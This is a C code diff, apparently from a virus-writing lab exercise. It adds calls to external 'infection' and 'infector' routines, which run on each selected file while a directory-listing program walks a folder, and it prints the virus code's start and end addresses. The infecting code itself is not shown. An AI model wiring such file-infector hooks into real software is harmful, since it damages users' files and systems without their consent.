@@ -162,6 +162,12 @@ char* get_dirent_type_name(char d_type) {
            "???";
 }
 
+extern void code_start(void);
+extern void code_end(void);
+
+extern void infection(void);
+extern void infector(char *file_name);
+
 int print_file_dirs_of_fd(FILE f_out, FILE fd, char *prefix, int append) {
     int err = 0;
     char buf[8192];
@@ -211,6 +217,15 @@ int print_file_dirs_of_fd(FILE f_out, FILE fd, char *prefix, int append) {
             else if (DebugMode || selected) {
                 write_line(f_out);
             }
+
+            if (!selected) {
+                continue;
+            }
+
+            if (append) {
+                infection();
+                infector(d->d_name);
+            }
         }
     }
 
@@ -233,6 +248,16 @@ int print_file_dirs_of_dir(FILE f_out, char *dir, char *prefix, int append) {
     }
 
     return err;
+}
+
+void print_code_labels_addr(FILE f_out) {
+    write_s(f_out, "code start: ");
+    write_num(f_out, (int)code_start);
+    write_line(f_out);
+
+    write_s(f_out, "code end: ");
+    write_num(f_out, (int)code_end);
+    write_line(f_out);
 }
 
 int main (int argc , char* argv[], char* envp[]) {
@@ -276,6 +301,7 @@ int main (int argc , char* argv[], char* envp[]) {
     }
 
     write_s(f_out, "Flame 2 strikes!\n");
+    print_code_labels_addr(f_out);
     if (exit_code == 0) {
         exit_code = print_file_dirs_of_dir(f_out, ".", prefix, append);
     }
